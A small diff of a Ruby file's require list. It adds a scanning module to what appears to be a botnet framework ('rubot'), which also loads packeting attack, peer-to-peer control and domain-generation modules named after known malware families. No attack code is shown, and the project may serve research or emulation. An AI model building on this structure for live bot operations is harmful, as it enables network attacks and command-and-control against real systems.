@@ -1,6 +1,7 @@
 require 'eventmachine'
 require 'socket'
 require 'rubot/attack/packeting'
+require 'rubot/attack/scanning'
 require 'rubot/control/p2p/p2p'
 require 'rubot/control/dga/bamital'
 require 'rubot/control/dga/blackhole'
